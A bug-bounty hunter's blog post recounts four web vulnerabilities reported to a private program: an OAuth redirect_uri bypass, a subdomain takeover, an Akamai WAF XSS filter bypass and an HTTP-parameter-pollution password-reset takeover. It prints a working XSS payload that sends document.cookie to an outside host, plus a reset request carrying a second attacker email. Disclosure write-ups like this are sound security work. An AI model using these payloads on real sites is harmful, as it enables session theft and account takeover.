---
layout:	"post"
categories:	"blog"
title:	"How I earned 60K+ from private program"
date:	2018-04-25
thumbnail:	/img/1h86As8FAHN4QE0TWziLETg.jpeg
author:	siva
---

* * *

Hey there!

I am not a security researcher that you often come across in the security
community. I am Siva. Like every bug hunter I began my journey by reading
security write ups, books and hackerone reports. After doing all that I still
can't find a good bug in websites. Like how you search subdomains, I started
searching for bug bounty programs that aren't on hackerone or atleast not in
the eyes of community.

 **intext: "Responsible Disclosure Policy"**

Results came up and I found a lot of them are on H1 already. And finally
choosen a Indian (❤) company as a target. Assume it as redacted.com since they
told me not to disclose the bugs publicly.

Though I found multiple bugs. I am not interested in usual bugs. I will be
sharing only special ones.

  1.  **Redacted.com** consists of a number of apps running in various sub-domains and it uses Oauth2 to implement authentication to all those apps. You know what anyone does when there is a oauth2. Replaced redirect_uri with <http://evil.com> and result is "The redirect_uri is not registered with client". So while I was looking at burp logs.

Usual oauth authorisation endpoint was like
[https://sub.redacted.com/oauth2/authorize](https://redacted.com/oauth2/authorize)?param=X&redirect_uri=https://sub.redacted.com/?code=

To my wonder I found another end point in burp log related to oauth2. It is
like

[https://sub.redacted.com/oauth2/l](https://redacted.com/oauth2/authorize)ogin?param=X&redirect_uri=https://sub.redacted.com/?code=

Changed the redirect_uri and this time it worked. I reported it immediately
and got a quick response from the team.

The next day I was awarded some 13k. Got first bounty ❤ . [Remeber how you
felt when you got your first one.]

Out of excitement I fired burp suite again. Found an XSS again [Keep a note of
this ] . Reported.

 **2\. Subdomain Takeover:**

>>Virustotal.com

searched redacted.com and got a list of subdomains. I checked for alias of all
subdomains and found a subdomain pointing somedomain.com which was an expired
domain. There is an email on the main page saying contact to buy.

Okay! I sent a mail to that guy asking the price of the subdomain.com and he
was like :

" Man! I had breakup with my girl and I need a ring to give her and get her
back in my life! How much can you give?"

![](/img/1h86As8FAHN4QE0TWziLETg.jpeg)

I reported this to the program and they credited some more amount in my
account.

 **3\. XSS filter Bypass:**

This is my great finding *Appreciating myself* . So there is sub-domain that
is reflecting any parameters on the page. Okay! Injected some HTML content.
Got rendered on the page. Inserted some javascript into the param. Got this

![](/img/1zjBJjZdpDHptP_s1P6I5jg.png)

Response. Btw it's not ebay.com :P

Okay! Deduction! It's using Akamai WAF. Couldn't find any bypasses relevant to
my case. So I am checking different vectors. After trying different vectors I
got some conclusions. The vector I use should not contain

  * Keywords : Javascript,alert,confirm,prompt,event handlers.
  * No parentheses.
  * No native method calling like document.cookie()

After some research over the internet, I found a way to bypass this case. The
following vector does the bypass work. If you came across akamai WAF, may the
following vector bypasses it.

 **< object onafterscriptexecute={window['location']="//**[
**dontknowsss.com/**](http://dontknowsss.com/) **? "%2bdocument['cookie']}>**

This allows cookie stealing directly, it's not just a simple alert(1). I would
suggest you to use this kind of POC.

Reported this and got bucks for this as well.

 **4\. HPP account takeover**

If you don't know what HTTP parameter pollution is, Check it out [here at
OWASP](https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_
%28OTG-INPVAL-004%29). OWASP is really a best place to learn about all kinds
of attacks possible on web applications. [ Go right now if your are new to
this ].

Coming to the bug I found. One of the sub-domain hosts a application that has
retail user panel. All retail users can login over there and do stuff. I
created account on it and before logging in, I wanted to test the forgot
password functionality. :P

I turned on burp intercept mode to tamper data. What anyone will test with
forgot password functionality. Added a header X-Forwarded-Host: test.com to if
the reset link gets modified to test.com/token. But Nope! it didn't. It had a
single parameter i.e.;

 **email=owner12@domain.tld**

I did HPP with this and it was like

 **email=owner12@domain.tld &email=attacker@yopmail.com**

And I got reset link in both the email. This way I was able to compromise all
the retail users selling on the website. They paid me highest for this issue.

I think it already became too long for readers to read this article. I would
like to stop here and post my other findings in future posts.

 **PS: The 60k is in INR not in USD  :P**

 **Special Notes:**

I would like to thank all great people who contributed to the community and
shared their value attack strategies.

I learnt all these stuff because someone shared something. I thought now it's
my turn to contribute to community. So I did.

Please share your knowledge and help the community. Sharing is Caring.

If you are a newbie and wanted to learn everything from basics my DM is always
open [twitter/le4rner](https://twitter.com/le4rner) to get information about
learning stuff.

Happy Hunting,

[Siva Krishna.](https://twitter.com/le4rner)

